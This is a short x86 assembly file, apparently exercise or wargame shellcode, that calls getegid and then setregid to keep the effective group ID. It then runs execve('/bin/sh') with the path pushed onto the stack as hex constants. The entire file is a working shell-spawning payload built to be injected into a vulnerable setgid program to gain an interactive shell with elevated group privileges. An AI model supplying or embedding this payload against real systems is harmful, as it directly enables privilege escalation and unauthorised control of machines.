#include <sys/syscall.h>

.globl  main
.type   main, @function

main:
  /*
      Objective:
        Calling three functions.

        int egid = getegid();
        setregid(egid, egid);
        execve("/bin/sh", 0, 0);
  */ 

  // getegid()
  mov $50, %eax
  int $0x80
  // save eax
  mov %eax, %edx

 // setregid
  mov $71, %eax
  mov %edx, %ebx
  mov %ebx, %ecx
  mov $0, %edx
  int $0x80

  // execve
  push  $0                  /* mark the end as 00 00 00 00 (4-byte zero) */
  push  $0x68732f6e         /* push 6e 2f 73 68  (n/sh) */
  push  $0x69622f2f         /* push 2f 2f 62 69  (//bi */

  mov $11, %eax
  mov %esp, %ebx
  mov $0, %ecx
  mov $0, %edx
  int $0x80
